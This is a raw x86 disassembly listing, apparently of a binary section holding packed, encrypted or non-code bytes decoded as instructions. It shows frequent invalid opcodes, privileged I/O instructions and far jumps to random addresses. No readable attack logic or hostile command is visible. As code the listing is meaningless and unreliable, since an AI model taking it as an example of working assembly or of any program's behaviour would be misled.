  41ac87:	rcl    BYTE PTR [ebx],1
  41ac89:	or     ecx,esp
  41ac8b:	push   cs
  41ac8c:	xchg   DWORD PTR [edi-0x3a52c5e7],ebp
  41ac92:	or     dl,BYTE PTR [esi+0x7e]
  41ac95:	inc    esi
  41ac96:	mov    edi,0x72a9963c
  41ac9b:	rcl    DWORD PTR [ecx],0x82
  41ac9e:	je     0x41ac87
  41aca0:	push   ds
  41aca1:	test   eax,0x6d5858ae
  41aca6:	adc    ebx,DWORD PTR [ebp+edi*1+0x38]
  41acaa:	int3   
  41acab:	mov    al,ds:0xbfc112c0
  41acb0:	loope  0x41acc8
  41acb2:	fst    QWORD PTR [esi+0x5fa57178]
  41acb8:	fidiv  WORD PTR [ecx]
  41acba:	push   cs
  41acbb:	in     al,0x86
  41acbd:	fwait
  41acbe:	mov    BYTE PTR [ebp+0x64fb49da],ch
  41acc4:	stos   BYTE PTR es:[edi],al
  41acc5:	sbb    ch,BYTE PTR [ebp-0x63854c0d]
  41accb:	mov    WORD PTR [edx+0x1c],ds
  41acce:	retf   0x6704
  41acd1:	adc    esp,DWORD PTR [ebx+0x4]
  41acd4:	jmp    0x41acd0
  41acd6:	(bad)  
  41acd7:	push   eax
  41acd8:	ret    
  41acd9:	push   eax
  41acda:	xchg   BYTE PTR [edx+0x123ae7b6],dl
  41ace0:	(bad)  
  41ace1:	scas   al,BYTE PTR es:[edi]
  41ace2:	popa   
  41ace3:	sub    ebp,DWORD PTR [edi+0x19]
  41ace6:	ds xchg esi,eax
  41ace8:	mov    eax,0x15a12a56
  41aced:	or     DWORD PTR [edx-0x21f8d559],edx
  41acf3:	jae    0x41ad04
  41acf5:	stos   DWORD PTR es:[edi],eax
  41acf6:	jae    0x41aca0
  41acf8:	or     al,0xad
  41acfa:	pop    esp
  41acfb:	adc    BYTE PTR [eax],al
  41acfd:	jns    0x41ad75
  41acff:	mov    ecx,0xf1ec2878
  41ad04:	and    ebp,DWORD PTR [ebp+0x48f22266]
  41ad0a:	in     al,dx
  41ad0b:	or     al,0xeb
  41ad0d:	ins    BYTE PTR es:[edi],dx
  41ad0e:	cwde   
  41ad0f:	sar    BYTE PTR [eax],cl
  41ad11:	xchg   ebp,eax
  41ad12:	int    0x7e
  41ad14:	sub    al,0xc2
  41ad16:	push   edi
  41ad17:	mov    edx,edi
  41ad19:	ret    0x9871
  41ad1c:	outs   dx,BYTE PTR ds:[esi]
  41ad1d:	mov    esp,DWORD PTR [eax+0x45]
  41ad20:	jle    0x41acd9
  41ad22:	add    ecx,DWORD PTR [ebx]
  41ad24:	aas    
  41ad25:	ss mov edx,0x655a4263
  41ad2b:	daa    
  41ad2c:	jne    0x41ad6f
  41ad2e:	push   0xcb5ee5a1
  41ad33:	push   eax
  41ad34:	xchg   edx,eax
  41ad35:	jb     0x41acc9
  41ad37:	cmp    bh,BYTE PTR [edx-0x5cab74b2]
  41ad3d:	dec    eax
  41ad3e:	jmp    0x43f7:0xaa3c9dcf
  41ad45:	add    ecx,ebp
  41ad47:	nop
  41ad48:	pop    ecx
  41ad49:	aaa    
  41ad4a:	pop    ebp
  41ad4b:	fwait
  41ad4c:	inc    esp
  41ad4d:	jmp    0xf18725e0
  41ad52:	add    al,0x72
  41ad54:	pop    ss
  41ad55:	inc    ecx
  41ad56:	mov    cl,0x26
  41ad58:	pop    eax
  41ad59:	sbb    eax,0xc0665bdd
  41ad5e:	jo     0x41ad04
  41ad60:	xchg   edi,eax
  41ad61:	inc    esp
  41ad62:	inc    edx
  41ad63:	lods   eax,DWORD PTR ds:[esi]
  41ad64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad65:	xor    al,0x88
  41ad67:	adc    eax,0xb3308f52
  41ad6c:	popf   
  41ad6d:	xor    edi,DWORD PTR [ecx+0x3621e645]
  41ad73:	pop    es
  41ad74:	add    edx,edx
  41ad76:	in     eax,dx
  41ad77:	cmp    esp,esp
  41ad79:	jae    0x41ada8
  41ad7b:	dec    ebx
  41ad7c:	sub    al,0x5b
  41ad7e:	fdiv   DWORD PTR [eax-0xf]
  41ad81:	cmp    ecx,DWORD PTR [edx]
  41ad83:	mov    eax,ds:0x6b6e8c49
  41ad88:	out    dx,al
  41ad89:	scas   al,BYTE PTR es:[edi]
  41ad8a:	add    edx,DWORD PTR [esp+eiz*4-0x75]
  41ad8e:	push   ebp
  41ad8f:	push   eax
  41ad90:	dec    ecx
  41ad91:	jp     0x41ae06
  41ad93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad94:	lods   eax,DWORD PTR ds:[esi]
  41ad95:	fisttp WORD PTR [ebp+0x3d]
  41ad98:	hlt    
  41ad99:	inc    ebx
  41ad9a:	dec    ecx
  41ad9b:	pushf  
  41ad9c:	add    BYTE PTR [edi+ebp*2],bl
  41ad9f:	fisttp QWORD PTR [ebp+0x384c6107]
  41ada5:	adc    esp,DWORD PTR cs:0x26d71e8f
  41adac:	lods   eax,DWORD PTR gs:[esi]
  41adae:	xor    al,0x40
  41adb0:	sub    ch,cl
  41adb2:	int3   
  41adb3:	popf   
  41adb4:	addr16 jne 0x41adf0
  41adb7:	or     eax,DWORD PTR [eax+esi*8]
  41adba:	mov    dl,0x9c
  41adbc:	scas   eax,DWORD PTR es:[edi]
  41adbd:	jmp    0x1905288d
  41adc2:	and    ebx,DWORD PTR [eax+0x4d]
  41adc5:	sbb    ebx,DWORD PTR [edx]
  41adc7:	mov    esi,0x8eff7f6d
  41adcc:	xchg   edx,eax
  41adcd:	call   0xd5580f16
  41add2:	sti    
  41add3:	adc    DWORD PTR [ebx-0x260dc400],edx
  41add9:	add    edi,DWORD PTR [ecx]
  41addb:	add    dl,0x92
  41adde:	mov    dh,0xe0
  41ade0:	in     eax,dx
  41ade1:	(bad)  
  41ade2:	jmp    0x41add3
  41ade4:	jl     0x41ae36
  41ade6:	add    ecx,DWORD PTR [edi+0x3e]
  41ade9:	push   edi
  41adea:	int    0x9b
  41adec:	and    cl,BYTE PTR [edi-0x663cc9f5]
  41adf2:	loop   0x41ae5b
  41adf4:	mov    ?,WORD PTR [ebx]
  41adf6:	je     0x41ae45
  41adf8:	outs   dx,BYTE PTR ds:[esi]
  41adf9:	iret   
  41adfa:	sub    al,0x90
  41adfc:	fisub  DWORD PTR [eax-0x7a]
  41adff:	ss in  eax,dx
  41ae01:	aaa    
  41ae02:	mov    edx,0x1ce5899d
  41ae07:	or     BYTE PTR [ebx+0x34],ch
  41ae0a:	in     al,dx
  41ae0b:	xchg   DWORD PTR [edx],ecx
  41ae0d:	sbb    eax,0xba6aa2e1
  41ae12:	aam    0xf1
  41ae14:	push   edi
  41ae15:	hlt    
  41ae16:	call   0x5531:0x2d58fe69
  41ae1d:	sbb    DWORD PTR [ecx],edi
  41ae1f:	mov    dl,0x7a
  41ae21:	in     eax,0x79
  41ae23:	aaa    
  41ae24:	pusha  
  41ae25:	jnp    0x41ae88
  41ae27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae28:	rdtsc  
  41ae2a:	sti    
  41ae2b:	mov    ecx,0x574daa3
  41ae30:	xchg   edi,eax
  41ae31:	lods   al,BYTE PTR ds:[esi]
  41ae32:	push   esp
  41ae33:	sbb    edx,DWORD PTR [edx]
  41ae35:	push   ds
  41ae36:	dec    ecx
  41ae37:	test   esp,edx
  41ae39:	dec    ebp
  41ae3a:	dec    ecx
  41ae3b:	xchg   edi,eax
  41ae3c:	inc    edx
  41ae3d:	dec    edi
  41ae3e:	ins    DWORD PTR es:[edi],dx
  41ae3f:	mov    WORD PTR [edx-0x52],es
  41ae42:	xor    DWORD PTR [ebp-0x3b304d79],esp
  41ae48:	dec    edx
  41ae49:	mov    eax,ds:0xc6c9ef1b
  41ae4e:	push   ebp
  41ae4f:	or     dh,ch
  41ae51:	mov    ebp,DWORD PTR [ebx+0x69c086ed]
  41ae57:	jae    0x41ae99
  41ae59:	nop
  41ae5a:	push   ds
  41ae5b:	fwait
  41ae5c:	cmp    al,cl
  41ae5e:	daa    
  41ae5f:	fstp   TBYTE PTR [ecx+0x61]
  41ae62:	stos   BYTE PTR es:[edi],al
  41ae63:	xchg   esp,eax
  41ae64:	popa   
  41ae65:	mov    cl,0x14
  41ae67:	(bad)  
  41ae68:	fcmovbe st,st(5)
  41ae6a:	or     eax,DWORD PTR [eax]
  41ae6c:	pop    ebp
  41ae6d:	aas    
  41ae6e:	push   0xffffffdd
  41ae70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae71:	(bad)  
  41ae72:	cli    
  41ae73:	xchg   BYTE PTR ds:0x591f3cfe,dl
  41ae79:	fmul   QWORD PTR [edx+eax*4-0x716b31ea]
  41ae80:	dec    eax
  41ae81:	pop    ss
  41ae82:	js     0x41ae86
  41ae84:	pop    esp
  41ae85:	pop    ebx
  41ae86:	repz mov bl,0xae
  41ae89:	stos   DWORD PTR es:[edi],eax
  41ae8a:	dec    ecx
  41ae8b:	sbb    BYTE PTR [ebp-0x5c0f0fba],0x96
  41ae92:	imul   edx,DWORD PTR [edx+0x76],0x8fef48d5
  41ae99:	bound  edi,QWORD PTR [esi-0x4569efda]
  41ae9f:	(bad)  
  41aea1:	pop    eax
  41aea2:	mov    DWORD PTR [eax-0xb],0x822fc34d
  41aea9:	mov    dl,0x85
  41aeab:	ret    0xe616
  41aeae:	lods   eax,DWORD PTR ds:[esi]
  41aeaf:	pop    ecx
  41aeb0:	push   ecx
  41aeb1:	popf   
  41aeb2:	mov    eax,ds:0xe3634cc4
  41aeb7:	xchg   esi,eax
  41aeb8:	inc    esp
  41aeb9:	mov    ds:0x1f54ce36,eax
  41aebe:	call   0xe91d:0x3884bee7
  41aec5:	fistp  WORD PTR [edi+0x2847e537]
  41aecb:	fisub  WORD PTR [edx+esi*8-0x2f]
  41aecf:	pop    edi
  41aed0:	mov    ecx,0x2dc3292f
  41aed5:	retf   
  41aed6:	cdq    
  41aed7:	add    al,0x90
  41aed9:	mov    ds:0x9e8a4d33,eax
  41aede:	test   BYTE PTR [ebp+0xcd0e59d],dl
  41aee4:	cs test al,0xff
  41aee7:	(bad)  
  41aee8:	fstp   QWORD PTR [ecx+eiz*1]
  41aeeb:	jb     0x41af3b
  41aeed:	lods   al,BYTE PTR ds:[esi]
  41aeee:	jge    0x41aece
  41aef0:	cmova  esi,DWORD PTR [edx]
  41aef3:	xchg   ebp,eax
  41aef4:	call   0x873bd87
  41aef9:	mov    dh,0x8e
  41aefb:	fcomp  QWORD PTR [eax+0x59a6300f]
  41af01:	test   eax,0xd363c86b
  41af06:	jno    0x41ae8e
  41af08:	mov    ds:0x23f9d4d3,al
  41af0d:	jne    0x41af7e
  41af0f:	ret    
  41af10:	je     0x41af47
  41af12:	inc    ecx
  41af13:	mov    dl,0xc6
  41af15:	or     eax,0x6d6f2fdf
  41af1a:	sub    dh,BYTE PTR [esi+0x37]
  41af1d:	and    DWORD PTR [edi],0x24
  41af20:	or     eax,0xf0a21e82
  41af25:	dec    esi
  41af26:	push   ss
  41af27:	shl    al,0xca
  41af2a:	imul   ecx,esp,0xdc76fe73
  41af30:	push   ds
  41af31:	xchg   ebx,eax
  41af32:	out    0xfd,al
  41af34:	xor    eax,0x2a31bc93
  41af39:	adc    eax,0x2f90670a
  41af3e:	push   cs
  41af3f:	enter  0xaa28,0x52
  41af43:	inc    esi
  41af44:	mov    WORD PTR [esi],gs
  41af46:	fs mov esp,es
  41af49:	cwde   
  41af4a:	xor    eax,0x9b8981a0
  41af4f:	dec    edi
  41af50:	rcl    DWORD PTR [ecx-0x71],0x76
  41af54:	mov    ebx,0x5c52ea8c
  41af59:	mov    eax,0x9f7ca9f3
  41af5e:	test   BYTE PTR [eax-0x4e04e42],0x75
  41af65:	inc    esi
  41af66:	test   al,0x62
  41af68:	(bad)  
  41af69:	mov    esp,ebp
  41af6b:	bound  esp,QWORD PTR [esi+0x4f5ef044]
  41af71:	sar    BYTE PTR [ebx],1
  41af73:	loopne 0x41af5a
  41af75:	xchg   ebp,eax
  41af76:	cmp    DWORD PTR [edx+0x70],esp
  41af79:	jecxz  0x41af4f
  41af7b:	mov    eax,0xc89f5edf
  41af80:	jp     0x41afa8
  41af82:	test   BYTE PTR [edi-0x56b8f808],ch
  41af88:	adc    edx,ecx
  41af8a:	xor    eax,0x51739e52
  41af8f:	aad    0x98
  41af91:	ins    DWORD PTR es:[edi],dx
  41af92:	hlt    
  41af93:	jns    0x41af77
  41af95:	sub    al,0xf8
  41af97:	push   ebp
  41af98:	scas   eax,DWORD PTR es:[edi]
  41af99:	loope  0x41afbd
  41af9b:	push   ecx
  41af9c:	loopne 0x41af71
  41af9e:	ret    
  41af9f:	push   ax
  41afa1:	sub    eax,0x14a0aa45
  41afa6:	mov    esi,edi
  41afa8:	push   edx
  41afa9:	jl     0x41b005
  41afab:	pop    ebp
  41afac:	jecxz  0x41b01b
  41afae:	and    edx,DWORD PTR [esi-0x72e8664]
  41afb4:	sahf   
  41afb5:	fnstenv [edx-0x66609eeb]
  41afbb:	adc    eax,0x2dfa1ce5
  41afc0:	mov    bl,0x5c
  41afc2:	xrelease xchg DWORD PTR [esi+ebp*4+0x2ffd4e4d],edx
  41afca:	repnz push edx
  41afcc:	(bad)  
  41afcd:	(bad)
  41afd0:	sar    BYTE PTR [eax],1
  41afd2:	dec    ecx
  41afd3:	cmc    
  41afd4:	push   ss
  41afd5:	sbb    al,al
  41afd7:	popf   
  41afd8:	xor    al,0xfd
  41afda:	cld    
  41afdb:	call   0x5cec:0x1bc4a0e4
  41afe2:	shr    DWORD PTR [esi-0x74bcecc6],1
  41afe8:	mov    ds:0x716f3126,al
  41afed:	mov    bl,BYTE PTR [ebp-0x61807d05]
  41aff3:	inc    edi
  41aff4:	loopne 0x41afe5
  41aff6:	sub    BYTE PTR [ecx+edi*8],bl
  41aff9:	push   ecx
  41affa:	lods   al,BYTE PTR ds:[esi]
  41affb:	sub    al,0x72
  41affd:	addr16 cli 
  41afff:	or     al,0x4
  41b001:	jbe    0x41afb0
  41b003:	xlat   BYTE PTR ds:[ebx]
  41b004:	mov    al,0xa8
  41b006:	outs   dx,BYTE PTR ds:[esi]
  41b007:	cwde   
  41b008:	fs loope 0x41b005
  41b00b:	(bad)  
  41b00c:	xchg   edi,eax
  41b00d:	aam    0xd4
  41b00f:	(bad)  ds:0x2a451b65
  41b015:	mov    al,cl
  41b017:	adc    al,0x10
  41b019:	push   0xfffffff6
  41b01b:	mov    esi,0xfe0f1fcf
  41b020:	jae    0x41b05c
  41b022:	cdq    
  41b023:	xchg   ecx,esi
  41b025:	psadbw mm0,QWORD PTR [ebx+esi*4-0x57005ad5]
  41b02d:	pop    ebx
  41b02e:	lods   eax,DWORD PTR ds:[esi]
  41b02f:	adc    BYTE PTR ds:0xba1b126b,ch
  41b035:	imul   edi,DWORD PTR [edx-0x3b],0x3669d8ec
  41b03c:	mov    ah,0x97
  41b03e:	shl    edx,cl
  41b040:	add    BYTE PTR [esi],bh
  41b042:	(bad)  
  41b043:	sub    DWORD PTR [ebx],esi
  41b045:	push   edx
  41b046:	inc    esi
  41b047:	xlat   BYTE PTR ds:[ebx]
  41b048:	pop    ss
  41b049:	sti    
  41b04a:	call   0x7ced43f3
  41b04f:	xchg   DWORD PTR [edi+0x62db26c],esp
  41b055:	sar    BYTE PTR [ebx],0x6c
  41b058:	test   al,0x3f
  41b05a:	loopne 0x41b083
  41b05c:	pop    ebx
  41b05d:	loop   0x41b093
  41b05f:	(bad)  
  41b060:	sub    eax,0x99f7a456
  41b065:	and    DWORD PTR [edi],esi
  41b067:	mov    al,0x62
  41b069:	jl     0x41b06f
  41b06b:	jl     0x41affb
  41b06d:	dec    esp
  41b06e:	xor    eax,0x8959f6d0
  41b073:	outs   dx,BYTE PTR ds:[esi]
  41b074:	and    eax,0xc8e609c9
  41b079:	leave  
  41b07a:	mov    ah,0x40
  41b07c:	mov    dl,0x4b
  41b07e:	jmp    0xefd594fa
  41b083:	fsubr  DWORD PTR [esi]
  41b085:	pop    eax
  41b086:	stos   DWORD PTR es:[edi],eax
  41b087:	(bad)  
  41b089:	fisttp DWORD PTR [ebx+0x76530f0d]
  41b08f:	xchg   esp,eax
  41b090:	inc    edi
  41b091:	loop   0x41b100
  41b093:	mov    ebp,gs
  41b095:	sar    DWORD PTR [ecx],1
  41b097:	iret   
  41b098:	cmp    BYTE PTR [edx+ebx*2-0x5e],dh
  41b09c:	ficom  DWORD PTR ds:0x740acefb
  41b0a2:	popa   
  41b0a3:	and    DWORD PTR [ebp+0x69],0xc3dd6477
  41b0aa:	inc    ebp
  41b0ab:	push   edx
  41b0ac:	jo     0x41b083
  41b0ae:	pusha  
  41b0af:	cmp    eax,0xbd787d94
  41b0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b5:	lds    esi,FWORD PTR [ebx]
  41b0b7:	rol    BYTE PTR [ebx-0x313d2b1b],0xc5
  41b0be:	sbb    DWORD PTR [esi],edi
  41b0c0:	dec    edi
  41b0c1:	and    BYTE PTR [ebx+ecx*2+0x7554dcf5],ah
  41b0c8:	aas    
  41b0c9:	fisubr DWORD PTR [ebp+eiz*8+0x43]
  41b0cd:	jmp    0x213b7ffb
  41b0d2:	imul   ecx,edx,0x5b8c9443
  41b0d8:	icebp  
  41b0d9:	ror    esi,1
  41b0db:	dec    ebx
  41b0dc:	add    edi,DWORD PTR [edi]
  41b0de:	mov    al,ds:0x80b29619
  41b0e3:	dec    edi
  41b0e4:	hlt    
  41b0e5:	ftst   
  41b0e7:	mov    cs:0x552c25f4,al
  41b0ed:	aas    
  41b0ee:	push   esi
  41b0ef:	push   0x27108a7b
  41b0f4:	inc    ebx
  41b0f5:	repnz mov eax,ds:0xe88b1c
  41b0fb:	and    eax,0xeec1c892
  41b100:	nop
  41b101:	clc    
  41b102:	add    ch,BYTE PTR [esp+ebp*1+0x427d0ca3]
  41b109:	sbb    bl,BYTE PTR [ecx-0x7e671ef7]
  41b10f:	loope  0x41b10c
  41b111:	leave  
  41b112:	fst    st(3)
  41b114:	call   0xe09b:0x7df047f3
  41b11b:	popf   
  41b11c:	sbb    eax,0x5bc58c9
  41b121:	lea    edi,[edx+0x77]
  41b124:	inc    eax
  41b125:	es stc 
  41b127:	jae    0x41b1a6
  41b129:	icebp  
  41b12a:	dec    ebx
  41b12b:	push   ds
  41b12c:	ffree  st(3)
  41b12e:	pop    edx
  41b12f:	out    dx,al
  41b130:	dec    eax
  41b131:	(bad)  
  41b132:	xor    al,0x1e
  41b134:	sbb    BYTE PTR [ebx+0x6c],bl
  41b137:	fist   DWORD PTR [ecx-0x46008fe7]
  41b13d:	pop    ebx
  41b13e:	inc    ebx
  41b13f:	idiv   BYTE PTR [edi-0xc13d1f7]
  41b145:	add    eax,0xe959c716
  41b14a:	call   FWORD PTR ds:0xb642e256
  41b150:	outs   dx,BYTE PTR ds:[esi]
  41b151:	cmp    ch,0xcf
  41b154:	mov    ss,WORD PTR [ecx]
  41b156:	imul   edi,esp,0x25
  41b159:	mov    edi,0xb3c16dbf
  41b15e:	add    DWORD PTR [esi],eax
  41b160:	xchg   esp,ebx
  41b162:	and    DWORD PTR [edi],edx
  41b164:	mov    esp,0x8af50af9
  41b169:	lahf   
  41b16a:	jae    0x41b117
  41b16c:	nop
  41b16d:	mov    bl,BYTE PTR [eax+0x1f069fce]
  41b173:	sbb    BYTE PTR [ecx],dh
  41b175:	enter  0xa144,0x21
  41b179:	or     BYTE PTR [ecx],ch
  41b17b:	pop    ebx
  41b17c:	(bad)  
  41b17d:	stc    
  41b17e:	or     eax,0xfa482bff
  41b183:	imul   eax,ecx,0xa060f356
  41b189:	jg     0x41b1b8
  41b18b:	add    edx,edi
  41b18d:	cli    
  41b18e:	jae    0x41b20f
  41b190:	(bad)  
  41b191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b192:	jno    0x41b1b9
  41b194:	mov    ds:0x7dd53c1c,eax
  41b199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b19a:	ja     0x41b203
  41b19c:	xor    DWORD PTR [eax],0xffffffe1
  41b19f:	sbb    al,0x67
  41b1a1:	cld    
  41b1a2:	jmp    0x41b207
  41b1a4:	xchg   edx,eax
  41b1a5:	pop    eax
  41b1a6:	repz jmp 0x1ae2:0x17a034b6
  41b1ae:	ins    DWORD PTR es:[edi],dx
  41b1af:	(bad)  
  41b1b0:	(bad)  
  41b1b1:	push   es
  41b1b2:	inc    edx
  41b1b3:	out    0xfd,al
  41b1b5:	jmp    0x41b147
  41b1b7:	pop    ebx
  41b1b8:	ror    BYTE PTR [ecx],1
  41b1ba:	mov    ebp,0x960c2d9f
  41b1bf:	jmp    0x4291646f
  41b1c4:	xlat   BYTE PTR ds:[ebx]
  41b1c5:	jle    0x41b1ed
  41b1c7:	mov    eax,DWORD PTR [esi-0x80]
  41b1ca:	jmp    0xde510e1f
  41b1cf:	inc    eax
  41b1d0:	jl     0x41b1e5
  41b1d2:	mov    esi,0xfdb5837a
  41b1d7:	and    eax,0xa535bfd2
  41b1dc:	pushf  
  41b1dd:	(bad)  [esi+0x13abeb76]
  41b1e3:	mov    esi,0x75cf48f9
  41b1e8:	inc    edi
  41b1e9:	jmp    0x75d1e2e3
  41b1ee:	stos   DWORD PTR es:[edi],eax
  41b1ef:	stc    
  41b1f0:	lds    esp,FWORD PTR [eax]
  41b1f2:	sub    bh,BYTE PTR [eax+0xd]
  41b1f5:	lods   eax,DWORD PTR ds:[esi]
  41b1f6:	cmp    eax,0xaef02cdf
  41b1fb:	aas    
  41b1fc:	sub    DWORD PTR [eax],edx
  41b1fe:	dec    ecx
  41b1ff:	inc    esp
  41b200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b201:	ror    BYTE PTR [ecx],1
  41b203:	jg     0x41b253
  41b205:	cs sub al,0x4c
  41b208:	jle    0x41b19f
  41b20a:	in     al,0xa6
  41b20c:	cli    
  41b20d:	loopne 0x41b26c
  41b20f:	lds    eax,FWORD PTR [ecx+0x41fac076]
  41b215:	cmp    dh,dh
  41b217:	jbe    0x41b261
  41b219:	sbb    dh,al
  41b21b:	mov    ch,0x9a
  41b21d:	(bad)  
  41b21e:	pop    eax
  41b21f:	jne    0x41b20d
  41b221:	mov    ds:0x8acc7f9f,eax
  41b226:	mov    DWORD PTR [edi-0x14],esp
  41b229:	pop    esi
  41b22a:	aam    0x61
  41b22c:	pushf  
  41b22d:	dec    ebx
  41b22e:	xchg   edx,eax
  41b22f:	adc    al,0xda
  41b231:	stos   BYTE PTR es:[edi],al
  41b232:	popf   
  41b233:	mov    al,ds:0x920e82ed
  41b238:	sbb    bl,BYTE PTR ds:0x4f9350e
  41b23e:	out    dx,eax
  41b23f:	mov    ds:0x612d92a9,eax
  41b244:	adc    ecx,DWORD PTR [edi]
  41b246:	xchg   edx,eax
  41b247:	fwait
  41b248:	out    0xdd,eax
  41b24a:	imul   ecx,DWORD PTR [ebx+0x78df9dd7],0x4f
  41b251:	cs retf 
  41b253:	mov    ds:0xc72e4afb,eax
  41b258:	jns    0x41b209
  41b25a:	int    0xb1
  41b25c:	stc    
  41b25d:	repnz (bad) 
  41b260:	sbb    dh,ch
  41b262:	lahf   
  41b263:	lahf   
  41b264:	mov    edi,0x919b8d51
  41b269:	ds and esi,edi
  41b26c:	and    BYTE PTR [edx-0x5f4afc24],ah
  41b272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b273:	jl     0x41b2ea
  41b275:	xlat   BYTE PTR ds:[ebx]
  41b276:	test   DWORD PTR [edx],ebx
  41b278:	push   0xffffffd2
  41b27a:	int3   
  41b27b:	sub    ecx,DWORD PTR [edi+0x6cdcfc79]
  41b281:	push   ebx
  41b282:	mov    dl,0x55
  41b284:	rol    DWORD PTR [ecx],0x2f
  41b287:	(bad)  
  41b288:	adc    BYTE PTR [edx-0x73],al
  41b28b:	xchg   edi,eax
  41b28c:	mov    edi,0x3f55ab87
  41b291:	gs in  eax,dx
  41b293:	pop    ecx
  41b294:	pop    esi
  41b295:	retf   
  41b296:	dec    esp
  41b297:	ins    BYTE PTR es:[edi],dx
  41b298:	mov    BYTE PTR [esi+edi*2],ah
  41b29b:	ja     0x41b2ef
  41b29d:	fadd   QWORD PTR [eax+0x3cfaa9ae]
  41b2a3:	or     eax,0xfb2018f4
  41b2a8:	ins    DWORD PTR es:[edi],dx
  41b2a9:	lods   al,BYTE PTR ds:[esi]
  41b2aa:	or     eax,0x8b23a6b5
  41b2af:	jecxz  0x41b30e
  41b2b1:	stos   DWORD PTR es:[edi],eax
  41b2b2:	ror    DWORD PTR [eax-0x309a9793],cl
  41b2b8:	iret   
  41b2b9:	xchg   edx,eax
  41b2ba:	or     bh,dl
  41b2bc:	mov    bh,0xdc
  41b2be:	dec    DWORD PTR [esi-0x31]
  41b2c1:	jne    0x41b2aa
  41b2c3:	adc    ecx,ecx
  41b2c5:	fwait
  41b2c6:	into   
  41b2c7:	mov    ah,0xd5
  41b2c9:	fdivr  DWORD PTR [edi+edx*4-0x33865d]
  41b2d0:	pop    es
  41b2d1:	jmpw   0x15f9
  41b2d5:	fcomp  DWORD PTR [ebx-0x3780407c]
  41b2db:	xchg   DWORD PTR [esi-0x4b],esi
  41b2de:	xor    DWORD PTR [ecx],0x455d3aa2
  41b2e4:	sti    
  41b2e5:	aas    
  41b2e6:	cmp    DWORD PTR [ebx],edi
  41b2e8:	sbb    eax,0x6052f2c6
  41b2ed:	lock adc al,0x72
  41b2f0:	stc    
  41b2f1:	mov    esp,0x55f8cf91
  41b2f6:	je     0x41b295
  41b2f8:	pop    eax
  41b2f9:	(bad)  
  41b2fa:	cmp    eax,0x264ad5f4
  41b2ff:	or     bh,BYTE PTR [ebx]
  41b301:	rcpps  xmm7,XMMWORD PTR [esi+ebx*4-0x6ba353f6]
  41b309:	add    cl,BYTE PTR fs:[edi+0x79]
  41b30d:	or     cl,ah
  41b30f:	aam    0x53
  41b311:	cmp    BYTE PTR [edx-0x466a461a],al
  41b317:	fxtract 
  41b319:	fimul  WORD PTR [edi]
  41b31b:	xor    al,bh
  41b31d:	pop    ebp
  41b31e:	fwait
  41b31f:	adc    BYTE PTR [eax-0x5100bd67],bh
  41b325:	cld    
  41b326:	shl    ebx,1
  41b328:	xor    al,BYTE PTR [edi]
  41b32a:	xchg   DWORD PTR [eax-0x19ef015c],edi
  41b330:	and    BYTE PTR [ecx+eax*1-0x6fc3409],bl
  41b337:	mov    al,ds:0x77e83847
  41b33c:	in     eax,0x38
  41b33e:	out    dx,al
  41b33f:	mov    di,0x65e0
  41b343:	jno    0x41b30b
  41b345:	dec    ebx
  41b346:	js     0x41b352
  41b348:	icebp  
  41b349:	rcl    al,0xe3
  41b34c:	aam    0x9e
  41b34e:	dec    ecx
  41b34f:	mov    ch,0x64
  41b351:	enter  0x3f1b,0xa9
  41b355:	sbb    al,0x98
  41b357:	data16 icebp 
  41b359:	in     al,dx
  41b35a:	mov    edx,0x8525a660
  41b35f:	add    eax,0x60b471e0
  41b364:	push   0x26
  41b366:	mov    al,ds:0x1049b13e
  41b36b:	aaa    
  41b36c:	mov    cl,0x79
  41b36e:	xchg   esi,eax
  41b36f:	jg     0x41b330
  41b371:	popa   
  41b372:	cmp    al,0xd5
  41b374:	mov    WORD PTR [ebx],?
  41b376:	loope  0x41b37c
  41b378:	sti    
  41b379:	sbb    ah,bl
  41b37b:	cmp    al,0xb8
  41b37d:	in     al,dx
  41b37e:	in     al,dx
  41b37f:	in     al,0xbe
  41b381:	mov    bh,0xd7
  41b383:	(bad)  
  41b384:	and    DWORD PTR [ecx],0x78
  41b387:	pop    esi
  41b388:	dec    BYTE PTR ds:0x212db16c
  41b38e:	icebp  
  41b38f:	rcr    cl,cl
  41b391:	mov    ecx,0x5f20e4c9
  41b396:	stos   BYTE PTR es:[edi],al
  41b397:	mov    bl,0x6c
  41b399:	jl     0x41b37b
  41b39b:	rcr    BYTE PTR [esi],0x4b
  41b39e:	cmc    
  41b39f:	icebp  
  41b3a0:	shl    BYTE PTR [eax],1
  41b3a2:	or     BYTE PTR [ecx*4+0x7a56d365],dl
  41b3a9:	scas   al,BYTE PTR es:[edi]
  41b3aa:	jb     0x41b36a
  41b3ac:	mov    edx,0x147f6781
  41b3b1:	mov    ss,esp
  41b3b3:	dec    ebx
  41b3b4:	push   ebp
  41b3b5:	pop    edx
  41b3b6:	ret    
  41b3b7:	mov    eax,ds:0x8b4bb2ac
  41b3bc:	int3   
  41b3bd:	add    DWORD PTR [ecx+0x5a],edx
  41b3c0:	shr    dh,cl
  41b3c2:	xor    al,0x3b
  41b3c4:	push   ebp
  41b3c5:	nop
  41b3c6:	out    0x4b,al
  41b3c8:	loop   0x41b380
  41b3ca:	sbb    BYTE PTR [ebx-0xfdba085],ch
  41b3d0:	dec    edi
  41b3d1:	push   edi
  41b3d2:	test   BYTE PTR [ecx-0xe],ah
  41b3d5:	rcl    DWORD PTR [esi-0x5c],cl
  41b3d8:	fistp  DWORD PTR [eax+0x160876a2]
  41b3de:	cld    
  41b3df:	stos   BYTE PTR es:[edi],al
  41b3e0:	adc    BYTE PTR [edx+eax*8+0x1e],0xb3
  41b3e5:	jl     0x41b379
  41b3e7:	mov    esp,0xdab7e0be
  41b3ec:	jb     0x41b3ec
  41b3ee:	retf   
  41b3ef:	popf   
  41b3f0:	and    DWORD PTR [ebx],esp
  41b3f2:	xchg   DWORD PTR [edi+0x46],ebp
  41b3f5:	sbb    ebx,DWORD PTR [edx-0x1e0e8ff1]
  41b3fb:	out    dx,al
  41b3fc:	mov    ebx,0x33d49353
  41b401:	inc    edi
